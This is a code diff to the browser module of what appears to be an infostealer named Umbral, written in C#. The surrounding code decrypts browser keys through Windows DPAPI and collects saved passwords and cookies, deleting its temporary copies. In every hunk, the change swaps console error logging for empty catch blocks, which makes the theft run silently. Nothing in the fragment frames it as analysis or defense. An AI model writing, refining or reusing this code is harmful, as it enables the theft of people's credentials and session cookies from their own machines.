@@ -51,10 +51,7 @@ namespace Umbral.payload.Components.Browsers
                     key = ProtectedData.Unprotect(Convert.FromBase64String(encryptedKey).Skip(5).ToArray(), null,
                         DataProtectionScope.CurrentUser);
                 }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e);
-                }
+                catch { }
 
             if (!(key is null))
             {
@@ -94,10 +91,7 @@ namespace Umbral.payload.Components.Browsers
                     decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                 }
             }
-            catch (Exception e)
-            {
-                Console.WriteLine(e);
-            }
+            catch { }
 
             return decryptedData;
         }
@@ -140,10 +134,7 @@ namespace Umbral.payload.Components.Browsers
 
                         File.Delete(tempLoginDataPath);
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
-                    }
+                    catch { }
             }
 
             return passwords.ToArray();
@@ -195,10 +186,7 @@ namespace Umbral.payload.Components.Browsers
 
                         File.Delete(tempCookiesFilePath);
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
-                    }
+                    catch { }
             }
 
             return cookies.ToArray();
